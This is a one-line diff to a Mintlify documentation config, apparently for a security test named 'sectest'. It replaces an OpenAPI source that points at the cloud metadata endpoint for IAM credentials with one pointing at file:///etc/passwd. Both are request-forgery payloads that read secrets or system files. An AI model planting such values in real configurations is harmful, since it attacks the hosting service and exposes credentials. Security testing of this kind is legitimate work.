@@ -1,1 +1,1 @@
-{"$schema":"https://mintlify.com/docs.json","theme":"mint","name":"sectest","colors":{"primary":"#0D9373"},"navigation":{"pages":["index","quickstart"]},"api":{"openapi":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}}
+{"$schema":"https://mintlify.com/docs.json","theme":"mint","name":"sectest","colors":{"primary":"#0D9373"},"navigation":{"pages":["index","quickstart"]},"api":{"openapi":"file:///etc/passwd"}}
